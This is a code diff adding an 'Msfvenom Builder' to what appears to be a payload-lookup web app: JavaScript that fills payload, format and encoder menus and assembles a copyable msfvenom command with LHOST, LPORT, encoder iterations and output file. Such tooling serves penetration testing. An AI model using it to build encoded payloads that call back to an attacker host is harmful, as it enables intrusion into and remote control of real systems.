@@ -17,6 +17,40 @@ function populatePrimaryFilter() {
     });
 }
 
+// Update Filters
+function updateFilters() {
+  const primaryFilter = document.getElementById("primaryFilter").value;
+  const secondaryFilter = document.getElementById("secondaryFilter");
+  const msfvenomInputs = document.getElementById("msfvenomInputs");
+
+  // Reset fields
+  secondaryFilter.style.display = "block";
+  msfvenomInputs.style.display = "none";
+
+  if (primaryFilter === "Msfvenom Builder") {
+    secondaryFilter.style.display = "none";
+    msfvenomInputs.style.display = "block";
+    populateMsfvenomDropdowns();
+  }
+}
+
+function populateMsfvenomDropdowns() {
+  const payloadDropdown = document.getElementById("payloadDropdown");
+  const formatDropdown = document.getElementById("formatDropdown");
+  const encoderDropdown = document.getElementById("encoderDropdown");
+
+  const msfvenomData = allPayloads["Msfvenom Builder"];
+  payloadDropdown.innerHTML = msfvenomData.Payloads.map(
+    (payload) => `<option value="${payload}">${payload}</option>`
+  ).join("");
+  formatDropdown.innerHTML = ["raw", "exe", "php", "elf"].map(
+    (format) => `<option value="${format}">${format}</option>`
+  ).join("");
+  encoderDropdown.innerHTML = msfvenomData.Encoder.map(
+    (encoder) => `<option value="${encoder}">${encoder}</option>`
+  ).join("");
+}
+
 // Update Secondary Filter Options
 function updateSecondaryFilter() {
     const primaryFilter = document.getElementById("primaryFilter").value;
@@ -82,6 +116,30 @@ function updateSecondaryFilter() {
     if (!primaryFilter || !secondaryFilter) {
       errorMessage.textContent = "Please set filters to search.";
       return;
+    }
+
+    if (primaryFilter === "Msfvenom Builder") {
+      const lhost = document.getElementById("lhostInput").value.trim();
+      const lport = document.getElementById("lportInput").value.trim();
+      const filename = document.getElementById("filenameInput").value.trim();
+      const payload = document.getElementById("payloadDropdown").value;
+      const format = document.getElementById("formatDropdown").value;
+      const encoder = document.getElementById("encoderDropdown").value;
+      const iterations = document.getElementById("iterationsInput").value.trim();
+  
+      if (!lhost || !lport || !payload || !filename) {
+        errorMessage.textContent =
+          "Please fill all compulsory fields: LHOST, LPORT, Payload, and Filename.";
+        return;
+      }
+  
+      let msfPayload = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format || "raw"}`;
+      if (encoder) msfPayload += ` -e ${encoder}`;
+      if (iterations) msfPayload += ` -i ${iterations}`;
+      msfPayload += ` -o ${filename}`;
+  
+      resultsContainer.innerHTML = `<div class="payload-item">${msfPayload}</div>`;
+      copyButton.style.display = "inline-block";
     }
     
     let filteredPayloads = allPayloads[primaryFilter][secondaryFilter];
